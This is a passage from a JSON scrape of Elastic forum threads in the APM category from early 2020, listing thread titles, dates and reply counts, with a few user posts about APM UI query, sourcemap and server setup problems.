    "body": "Kibana version: 7.5.1 Elasticsearch version: 7.5.1 APM Server version: 7.5.1 APM Agent language and version: Java Agent on version 1.12.0 Is there anything special in your setup? All services run on docker Description of the problem including expected versus actual behavior: Actual behavior: When I type something in the query bar at the APM UI, I get no suggestions, and when I insert a search request, nothing happens. I do have results listed, and can see the fields that I try to query when I click on them. Actual behavior1194×284 18.5 KB Expected behavior: When I type in the query bar, I get suggestions, and when I enter queries they filter the results. Expected behavior2439×459 73.1 KB The error first occurred when I changed infra configurations in Kibana, but reversing these changes doesn't help. The query bar works on all other places in Kibana, and I can filter results from the apm-* index pattern on the Discovery page. I have also not found any relevant logs or errors. Thanks for your help!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3fec7147-ea58-42cd-85ad-c0230e7f2376",
    "url": "https://discuss.elastic.co/t/elastic-apm-angular-rum-0-4-1-sourcemap-publish-to-apm/219415",
    "title": "Elastic APM Angular Rum - 0.4.1 - Sourcemap publish to APM",
    "category": [
      "APM"
    ],
    "author": "sureshkumargarlapati",
    "date": "February 14, 2020, 4:31pm February 17, 2020, 12:03pm February 17, 2020, 2:36pm February 17, 2020, 3:42pm March 9, 2020, 11:42am",
    "body": "How do we publish source maps from angular project?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e7341f72-356b-4282-8917-204104326fc7",
    "url": "https://discuss.elastic.co/t/elastic-apm-rum-angular-0-4-1-code-autocompletion/219414",
    "title": "Elastic APM RUM angular 0.4.1 - Code Autocompletion",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 17, 2020, 3:01pm March 6, 2020, 12:18pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b35514f1-ceaf-4787-aefb-14b9b38526ba",
    "url": "https://discuss.elastic.co/t/apm-rest-api/218986",
    "title": "APM rest api",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 17, 2020, 9:00am February 12, 2020, 1:21pm February 12, 2020, 1:22pm February 12, 2020, 2:49pm February 14, 2020, 12:02pm February 17, 2020, 9:00am February 17, 2020, 9:13am February 17, 2020, 11:47am February 17, 2020, 2:54pm February 17, 2020, 11:58am February 17, 2020, 12:31pm February 17, 2020, 2:54pm February 17, 2020, 1:09pm February 17, 2020, 1:58pm February 17, 2020, 2:54pm February 17, 2020, 2:46pm March 9, 2020, 10:46am",
    "body": "",
    "website_area": "discuss",
    "replies": 17
  },
  {
    "id": "91d05246-fcea-4e84-9217-b92f3c9d5d40",
    "url": "https://discuss.elastic.co/t/apm-captureerror-pass-in-stacktrace-when-using-parameterized-message-objects/219589",
    "title": "APM.captureError: Pass in stacktrace when using parameterized message objects",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 17, 2020, 10:26am March 9, 2020, 5:59am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "99d898f9-8bd3-4f06-967d-5e4cef2aa433",
    "url": "https://discuss.elastic.co/t/is-there-any-way-to-convert-incoming-b3-trace-headers-to-elastic-apm-transactions/219455",
    "title": "Is there any way to convert incoming b3 trace headers to Elastic APM transactions",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 15, 2020, 5:09am February 16, 2020, 6:39am March 8, 2020, 2:39am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8ee156e2-a123-411a-acd6-39cc1562dad8",
    "url": "https://discuss.elastic.co/t/changing-apm-server-configuration-on-elastic-cloud/219198",
    "title": "Changing APM server configuration on Elastic Cloud",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 13, 2020, 8:05pm February 13, 2020, 8:31pm February 14, 2020, 9:41am March 6, 2020, 5:52am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "be9a2fe7-c3ad-4bb7-be74-50fc543b9f0b",
    "url": "https://discuss.elastic.co/t/elastic-apm-agent-with-docker/217862",
    "title": "Elastic APM Agent with Docker",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 5, 2020, 8:08am February 5, 2020, 8:15am February 5, 2020, 9:26am February 5, 2020, 10:49am February 5, 2020, 7:16pm February 14, 2020, 8:33am March 6, 2020, 4:34am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "65b8edd6-e55f-45ca-8438-ef5cadef8b75",
    "url": "https://discuss.elastic.co/t/custom-transaction-not-showing-up-in-apm/219310",
    "title": "Custom Transaction not showing up in APM",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 14, 2020, 5:31am February 14, 2020, 5:30am March 6, 2020, 1:30am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "43ef7c69-332b-406c-b9b9-e2087e79151b",
    "url": "https://discuss.elastic.co/t/finer-trace-of-method-calls-in-rails/219255",
    "title": "Finer trace of method calls in Rails",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 13, 2020, 4:38pm February 13, 2020, 8:22pm March 5, 2020, 4:22pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b407a1a8-4da1-4f2d-aa44-627d6d2f3cd6",
    "url": "https://discuss.elastic.co/t/configuring-apm-to-a-non-web-net-framework-4-6-project/219226",
    "title": "Configuring APM to a non web - .NET framework 4.6 project",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 13, 2020, 2:24pm February 13, 2020, 6:18pm February 13, 2020, 2:36pm March 5, 2020, 10:36am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "decfcf44-3ab7-43a5-97de-c9a6bb01690f",
    "url": "https://discuss.elastic.co/t/error-while-launching-apm-server/218714",
    "title": "Error while launching APM server",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 11, 2020, 7:22am February 12, 2020, 3:34pm February 13, 2020, 4:38am March 5, 2020, 12:38am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c49d273d-6946-487b-b1ae-da9acc121b52",
    "url": "https://discuss.elastic.co/t/new-version-of-dotnet-agent/218599",
    "title": "New version of dotnet agent",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 10, 2020, 1:48pm February 10, 2020, 2:06pm February 10, 2020, 2:25pm February 12, 2020, 6:23pm March 4, 2020, 2:23pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "f1232e16-435e-420a-a45d-8514d4f8791b",
    "url": "https://discuss.elastic.co/t/net-framework-full-agent-not-sending-data/218327",
    "title": ".NET Framework Full agent not sending data",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 7, 2020, 11:01am February 10, 2020, 2:14pm February 10, 2020, 2:27pm February 12, 2020, 6:21pm March 4, 2020, 2:28pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b1544975-843e-4679-8522-3b390f55637c",
    "url": "https://discuss.elastic.co/t/how-to-set-distributed-tracing-setting-in-rum-agent/217329",
    "title": "How to set distributed tracing setting in RUM agent?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 31, 2020, 12:54pm February 3, 2020, 12:57pm February 4, 2020, 1:50am February 11, 2020, 1:26pm February 12, 2020, 12:30am March 3, 2020, 8:30pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "0922e511-4a18-48df-a949-88b8190768f3",
    "url": "https://discuss.elastic.co/t/span-events-missing-kubernetes-metadata/218237",
    "title": "Span events missing kubernetes metadata",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 7, 2020, 10:29am February 6, 2020, 7:23pm February 7, 2020, 10:34am February 7, 2020, 6:35pm February 7, 2020, 10:22pm February 10, 2020, 9:07am February 10, 2020, 5:55pm February 11, 2020, 3:16am February 11, 2020, 6:44pm March 3, 2020, 2:45pm",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "caf50e9f-2a30-46bf-b314-2f3b795f01d3",
    "url": "https://discuss.elastic.co/t/response-code-503-showing-in-application/218549",
    "title": "Response Code 503 showing in application",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 10, 2020, 10:59am February 10, 2020, 12:40pm February 10, 2020, 12:56pm February 10, 2020, 12:58pm February 11, 2020, 1:02pm March 3, 2020, 9:02am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "71d27e5a-6d81-42d2-af42-02da2ea11ed7",
    "url": "https://discuss.elastic.co/t/i-dont-see-apm-agent-logs-in-my-spring-boot-application-logs/218591",
    "title": "I dont see apm agent logs in my spring boot application logs",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 10, 2020, 1:12pm February 10, 2020, 2:09pm March 2, 2020, 10:09am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e0294fe5-4272-41ad-8264-1e4d941493ed",
    "url": "https://discuss.elastic.co/t/no-transaction-data-in-apm/217802",
    "title": "No transaction data in APM",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 4, 2020, 12:59pm February 4, 2020, 12:59pm February 4, 2020, 5:09pm February 4, 2020, 5:10pm February 5, 2020, 8:08am February 5, 2020, 12:33pm February 5, 2020, 2:52pm February 5, 2020, 3:58pm February 5, 2020, 4:48pm February 10, 2020, 1:20pm March 2, 2020, 9:20am",
    "body": "",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "9c428736-e876-4551-b33b-f01d0cf88139",
    "url": "https://discuss.elastic.co/t/uses-an-unsupported-class-file-version-pre-java-5-and-cant-be-instrumented-consider-updating-to-a-newer-version-of-that-library/218531",
    "title": "Uses an unsupported class file version (pre Java 5) and can't be instrumented. Consider updating to a newer version of that library",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 10, 2020, 8:03am February 10, 2020, 8:09am March 2, 2020, 4:09am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3af6a15b-b2ab-457e-8bd9-15720c732aa7",
    "url": "https://discuss.elastic.co/t/support-for-asynchronous-message-communication-with-spring-cloud-stream-on-rabbitmq/218175",
    "title": "Support for asynchronous message communication with Spring Cloud Stream on RabbitMQ",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 6, 2020, 2:07pm February 6, 2020, 2:11pm February 6, 2020, 2:35pm February 6, 2020, 3:10pm February 10, 2020, 5:51am March 2, 2020, 1:51am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "614f3e6a-6420-42f6-b34d-019e685bb85e",
    "url": "https://discuss.elastic.co/t/apm-server-transport-error-503-unexpected-apm-server-response/217273",
    "title": "APM Server transport error (503): Unexpected APM Server response",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 31, 2020, 12:57pm January 31, 2020, 4:26pm February 1, 2020, 3:00am February 3, 2020, 10:08pm February 4, 2020, 9:28am February 4, 2020, 5:02pm February 7, 2020, 6:27am February 7, 2020, 8:56pm February 28, 2020, 4:56pm",
    "body": "",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "0a6c170c-ac8f-4db6-a021-ca90cdb89eee",
    "url": "https://discuss.elastic.co/t/maven-snapshot-repository/218032",
    "title": "Maven SNAPSHOT repository",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 5, 2020, 5:15pm February 5, 2020, 5:39pm February 7, 2020, 2:55pm February 28, 2020, 10:49am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "cddc608e-b166-498f-842b-d7f310e6ee37",
    "url": "https://discuss.elastic.co/t/no-data-for-breakdown-graphs/218328",
    "title": "No data for breakdown graphs",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 7, 2020, 11:05am February 7, 2020, 12:32pm February 28, 2020, 8:32am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6f5f0bbd-a6f7-41ee-b4bc-4625da8b2744",
    "url": "https://discuss.elastic.co/t/apm-rum-roadmap-will-there-be-rum-for-swift-ios-java-android-and-react-native/218313",
    "title": "APM RUM Roadmap: Will there be RUM for Swift(iOS), Java(Android) and React Native?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 7, 2020, 10:07am February 7, 2020, 10:18am February 7, 2020, 11:12am February 28, 2020, 7:12am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "94fca466-24ab-477f-a8ca-7296528be566",
    "url": "https://discuss.elastic.co/t/apm-configuration-via-api/217989",
    "title": "APM configuration via API",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 5, 2020, 4:44pm February 6, 2020, 5:51pm February 6, 2020, 5:51pm February 27, 2020, 1:51pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7b4792ca-dd6a-45ff-9e29-76c016823dc1",
    "url": "https://discuss.elastic.co/t/how-to-configure-apm-of-elastic-search-in-asp-net-framework/216086",
    "title": "How to configure APM of elastic search in ASP.NET Framework?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 22, 2020, 5:02pm January 22, 2020, 5:06pm January 27, 2020, 1:24pm January 28, 2020, 9:27am January 30, 2020, 8:47am January 31, 2020, 12:46pm February 3, 2020, 3:13pm February 6, 2020, 9:17am March 5, 2020, 9:18am",
    "body": "",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "16a31b7f-5500-4660-8e63-09dfdf72de3d",
    "url": "https://discuss.elastic.co/t/how-to-reduce-apm-transactions-and-metrics/215206",
    "title": "How to reduce APM transactions and metrics?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 16, 2020, 11:47pm January 16, 2020, 2:34am January 16, 2020, 3:17am January 16, 2020, 6:31am January 17, 2020, 12:06am January 17, 2020, 4:08pm January 20, 2020, 9:19pm January 21, 2020, 4:24pm January 21, 2020, 7:36pm January 27, 2020, 4:23pm February 5, 2020, 9:49pm February 5, 2020, 9:52pm February 26, 2020, 5:51pm",
    "body": "",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "022b16e1-c240-4f88-8373-5d5b117e63bc",
    "url": "https://discuss.elastic.co/t/are-the-web-requests-obtained-by-apm-rum-asynchronous-or-synchronous/218050",
    "title": "Are the web requests obtained by APM RUM asynchronous or synchronous?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 5, 2020, 6:57pm February 5, 2020, 7:36pm February 5, 2020, 7:59pm February 26, 2020, 4:10pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "5dbfee5a-0b1a-439d-8a7b-92a69722ba0b",
    "url": "https://discuss.elastic.co/t/elastic-experimental-java-agent-set-up/217955",
    "title": "Elastic experimental java agent set up",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 5, 2020, 10:20am February 5, 2020, 10:45am February 5, 2020, 11:00am February 26, 2020, 7:00am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "16295297-4597-41db-b6e4-8e3d55d303e1",
    "url": "https://discuss.elastic.co/t/capture-the-body-of-outgoing-client-http-requests/216248",
    "title": "Capture the body of outgoing (client) http requests",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 23, 2020, 1:34pm January 23, 2020, 1:40pm January 23, 2020, 3:18pm February 5, 2020, 9:08am February 5, 2020, 9:10am February 26, 2020, 5:10am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "c5a60397-9952-4aaa-8b84-23c04075d1c1",
    "url": "https://discuss.elastic.co/t/systemtotalcpuprovider-failed-instantiating-performancecounter/217811",
    "title": "SystemTotalCpuProvider Failed instantiating PerformanceCounter",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 4, 2020, 1:26pm February 4, 2020, 1:49pm February 5, 2020, 6:53am February 5, 2020, 8:31am February 26, 2020, 4:31am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "f06f36fc-887c-4f31-aaff-df38d7bb4e0e",
    "url": "https://discuss.elastic.co/t/apm-application-packages-for-weblogic/217069",
    "title": "APM application_packages for WebLogic",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 29, 2020, 7:40pm January 30, 2020, 6:27am January 30, 2020, 8:06pm February 4, 2020, 10:33pm February 4, 2020, 10:34pm February 25, 2020, 6:34pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "83ecae75-0472-4b3e-9e3b-6eb2f10ed4a7",
    "url": "https://discuss.elastic.co/t/payloadsenderv2-failed-sending-events-following-events-were-not-transferred-successfully-to-the-server/217184",
    "title": "{PayloadSenderV2} Failed sending events. Following events were not transferred successfully to the server",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 30, 2020, 12:43pm January 30, 2020, 1:13pm February 1, 2020, 6:23pm February 4, 2020, 2:06pm February 25, 2020, 10:06am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "df2fa62f-b9c3-4404-85a1-d56d19d57882",
    "url": "https://discuss.elastic.co/t/apm-reporter-error-co-elastic-apm-agent-report-intakev2reportingeventhandler-error-sending-data-to-apm-server-cannot-retry-due-to-server-authentication-in-streaming-mode-response-code-is-401/217564",
    "title": "[apm-reporter] ERROR co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Error sending data to APM server: cannot retry due to server authentication, in streaming mode, response code is 401",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 3, 2020, 6:50am February 3, 2020, 6:50am February 3, 2020, 7:26am February 3, 2020, 7:58am February 3, 2020, 9:15am February 3, 2020, 10:53am February 3, 2020, 11:07am February 24, 2020, 7:09am",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "08ff59da-d1b4-49f1-9f1d-964bfc7565fe",
    "url": "https://discuss.elastic.co/t/does-elastic-apm-span-frames-min-duration-setting-apply/217187",
    "title": "Does elastic.apm.span_frames_min_duration setting apply?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 30, 2020, 1:03pm January 30, 2020, 1:10pm January 31, 2020, 8:30am January 31, 2020, 3:14pm February 2, 2020, 5:00am February 2, 2020, 6:48am February 23, 2020, 2:48am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d116af8b-fd4c-40f2-ad58-e051adc1f8b6",
    "url": "https://discuss.elastic.co/t/make-parameters-of-a-sql-query-visible-as-a-config-option/217025",
    "title": "Make parameters of a SQL query visible as a config option",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 29, 2020, 3:15pm January 31, 2020, 8:05pm January 31, 2020, 8:06pm February 21, 2020, 4:06pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d79dbdd2-4140-45a9-becb-d30c1a411d3c",
    "url": "https://discuss.elastic.co/t/db-statement-values-are-seen-for-some-spans-whereas-it-is-seen-as-in-others/217300",
    "title": "DB statement values are seen for some spans whereas it is seen as '?' in others",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 31, 2020, 12:54pm February 12, 2020, 6:23am February 21, 2020, 8:57am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0f18907a-a3fd-4eb4-a5e7-4d214f62305c",
    "url": "https://discuss.elastic.co/t/no-transactions-for-apache-httpclient/217235",
    "title": "No transactions for Apache HTTPClient",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 31, 2020, 11:50am January 30, 2020, 4:10pm January 31, 2020, 11:38am January 31, 2020, 12:53pm February 21, 2020, 9:05am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "7231dd3b-06d5-4291-bcdf-7c728260b051",
    "url": "https://discuss.elastic.co/t/dropped-spans-when-the-transaction-has-more-than-500-spans-default-how-is-it-decided-to-drop-which-spans/217338",
    "title": "Dropped spans when the transaction has more than 500 spans(default), how is it decided to drop which spans?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 31, 2020, 10:58am January 31, 2020, 12:23pm February 21, 2020, 8:10am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2ee6c51c-dc6f-43e9-bde5-b459707cb549",
    "url": "https://discuss.elastic.co/t/how-to-delete-only-unassigned-replica-shard-many-indices-created-automatically-and-my-node-goes-down/217108",
    "title": "How to delete only unassigned replica shard? many indices created automatically and my node goes down",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 30, 2020, 7:16am January 30, 2020, 6:10am January 30, 2020, 6:24am January 30, 2020, 7:06am January 30, 2020, 8:50am January 31, 2020, 5:59am February 28, 2020, 6:13am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "6187dfcb-4a3e-4097-a67d-a8501ff19a02",
    "url": "https://discuss.elastic.co/t/samples-for-setting-metrics-parameters-values-in-golang-java/216475",
    "title": "Samples for setting metrics parameters/values in GoLang/Java",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 30, 2020, 1:21pm January 30, 2020, 3:36pm January 31, 2020, 5:56am February 21, 2020, 1:56am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "0826f7fb-9dd8-4c01-8be7-479361c40df1",
    "url": "https://discuss.elastic.co/t/apm-indices-does-not-oblige-the-index-pattern-given-in-yaml-if-ilm-is-enabled/217154",
    "title": "APM indices does not oblige the index pattern given in yaml if ILM is enabled",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 30, 2020, 10:29am January 30, 2020, 4:17pm February 20, 2020, 12:17pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a1041ca6-1c26-43aa-b428-9c4ab8001e01",
    "url": "https://discuss.elastic.co/t/how-can-i-access-headers-or-custom-headers-in-apm/213673",
    "title": "How can I access headers or custom headers in APM?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 3, 2020, 9:56am January 3, 2020, 9:55am January 20, 2020, 7:11am January 27, 2020, 3:31pm January 30, 2020, 3:01pm January 30, 2020, 3:55pm February 20, 2020, 11:55am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "82c832f1-6aa6-41ca-b570-1668f2217957",
    "url": "https://discuss.elastic.co/t/cant-able-to-query-label-from-apm-dashboard/217148",
    "title": "Can't able to query label from APM dashboard",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 30, 2020, 10:43am January 30, 2020, 2:57pm February 20, 2020, 8:46am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f658d5cc-a374-4459-8bf4-14bc8c84ccf2",
    "url": "https://discuss.elastic.co/t/ignoring-certain-http-verbs-from-apm/214286",
    "title": "Ignoring certain HTTP verbs from APM",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 10, 2020, 1:02pm January 9, 2020, 2:27pm January 9, 2020, 4:05pm January 9, 2020, 4:21pm January 30, 2020, 12:21pm January 30, 2020, 1:17pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "c8ddb3d1-2f12-4733-832c-a6bc1d620d92",
    "url": "https://discuss.elastic.co/t/apm-agent-cannot-connect-to-apm-server/217130",
    "title": "APM agent cannot connect to apm server",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 30, 2020, 9:13am January 30, 2020, 10:17am January 30, 2020, 10:28am January 30, 2020, 12:39pm January 30, 2020, 12:47pm January 30, 2020, 12:47pm January 30, 2020, 12:50pm January 30, 2020, 12:52pm January 30, 2020, 12:52pm February 20, 2020, 9:02am",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "f8cb1592-6c54-4d9e-aa72-a550b1ff2dd7",
    "url": "https://discuss.elastic.co/t/apm-dashboard-is-not-getting-loaded/216390",
    "title": "APM dashboard is not getting loaded",
    "category": [
      "APM"
    ],
    "author": "Karthik_Medam",
    "date": "January 24, 2020, 8:49am January 24, 2020, 10:00am January 27, 2020, 9:46am January 30, 2020, 6:43am January 30, 2020, 8:43am February 20, 2020, 4:43am",
    "body": "If you are asking about a problem you are experiencing, please use the following template, as it will help us help you. If you have a different problem, please delete all of this text Kibana version: 6.6.1 Elasticsearch version: 6.6.1 APM Server version: 1.6.1 APM Agent language and version: latest Browser version: Version 79.0.3945.130 Original install method (e.g. download page, yum, deb, from source, etc.) and version: yum Fresh install or upgraded from other version? fresh install Is there anything special in your setup? For example, are you using the Logstash or Kafka outputs? Are you using a load balancer in front of the APM Servers? Have you changed index pattern, generated custom templates, changed agent configuration etc. We have provided Kibana loadbalancer Description of the problem including expected versus actual behavior. Please include screenshots (if relevant): image2964×920 111 KB Steps to reproduce: 1.Getting \"No services were found\" under APM app. 2. 3. Errors in browser console (if relevant): command throws error: apm-server setup -E setup.kibana.host=https://10.8.16.20:5601 -e 2020-01-24T08:21:33.652Z ERROR instance/beat.go:911 Exiting: fail to create the Kibana loader: Error creating Kibana client: Error creating Kibana client: fail to get the Kibana version: HTTP GET request to /api/status fails: fail to execute the HTTP GET request: Get https://10.8.16.20:5601/api/status: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers). Response: . Exiting: fail to create the Kibana loader: Error creating Kibana client: Error creating Kibana client: fail to get the Kibana version: HTTP GET request to /api/status fails: fail to execute the HTTP GET request: Get https://10.8.16.20:5601/api/status: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers). Response: . Provide logs and/or server output (if relevant):",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "8f1e86cf-b9fb-4779-a85e-b3b4c3606cee",
    "url": "https://discuss.elastic.co/t/java-apm-agent-is-throwing-exception-errors/216970",
    "title": "Java apm agent is throwing exception errors",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 29, 2020, 11:55am January 29, 2020, 11:56am January 29, 2020, 10:43am February 19, 2020, 6:43am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "59969d0d-57eb-464a-9a66-84a907e96ac6",
    "url": "https://discuss.elastic.co/t/application-error-when-lunch-update-with-jdbi/216973",
    "title": "Application error when lunch update with jdbi",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 29, 2020, 10:39am January 29, 2020, 10:09am February 19, 2020, 6:09am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a1c275eb-f1b7-45db-bbe8-6b8683ea8246",
    "url": "https://discuss.elastic.co/t/setup-apm-distributed-tracing-to-work-with-kafka-and-multiple-node-services/216716",
    "title": "Setup APM distributed tracing to work with kafka and multiple node services",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 27, 2020, 7:18pm January 28, 2020, 7:55am February 18, 2020, 3:55am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "66a0d874-558c-4f7c-90fa-d83c683f7d5d",
    "url": "https://discuss.elastic.co/t/what-causes-gaps-in-span/216680",
    "title": "What causes gaps in span",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 27, 2020, 3:07pm January 27, 2020, 3:41pm February 17, 2020, 11:41am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7eeee3b1-57c2-4c74-b50a-34be33167a6d",
    "url": "https://discuss.elastic.co/t/how-to-setup-prod-grade-apm-server/216391",
    "title": "How to setup PROD grade APM server",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 24, 2020, 12:04pm January 24, 2020, 9:35am January 24, 2020, 1:09pm January 25, 2020, 11:35am January 27, 2020, 9:49am February 17, 2020, 6:04am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "fe86f1d1-5a42-4bc8-a071-eda1eea79eca",
    "url": "https://discuss.elastic.co/t/kibana-apm-ui-not-displaying-cpu-memory-metric-for-kubernetes-pods-containers-shipping-apm-data/216011",
    "title": "Kibana APM UI not displaying CPU & Memory metric for Kubernetes pods/containers shipping APM data",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 22, 2020, 1:28pm January 22, 2020, 11:27am January 22, 2020, 12:02pm January 26, 2020, 7:37am February 16, 2020, 3:21am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "55e54c6e-da43-4fd4-a815-0cb19c108a0c",
    "url": "https://discuss.elastic.co/t/apm-server-build-failing/216170",
    "title": "APM Server build failing",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 23, 2020, 10:59am January 23, 2020, 10:58am January 23, 2020, 1:25pm January 24, 2020, 3:58am January 24, 2020, 2:29pm February 14, 2020, 10:29am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "8bc3ac5d-44ad-4baa-83c5-ba831a80c799",
    "url": "https://discuss.elastic.co/t/incorrect-error-grouping/215939",
    "title": "Incorrect Error Grouping",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 22, 2020, 9:18am January 23, 2020, 11:40am January 23, 2020, 11:40am February 13, 2020, 7:40am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "80388372-ba64-43b9-bd41-00070950e44c",
    "url": "https://discuss.elastic.co/t/integrating-a-application-logs-using-apm-server-in-existing-setup-of-kibana/216059",
    "title": "Integrating a application logs using APM server in existing setup of Kibana",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 22, 2020, 1:30pm January 23, 2020, 11:02am February 13, 2020, 7:02am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "bdf1d2b5-c7bf-4bcf-81f9-c35ce587c45e",
    "url": "https://discuss.elastic.co/t/apm-service-lifecycle-policies/216208",
    "title": "APM Service Lifecycle Policies",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 23, 2020, 10:26am January 23, 2020, 10:52am February 13, 2020, 6:52am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "836554b5-f35d-4920-a406-22aee1906d5b",
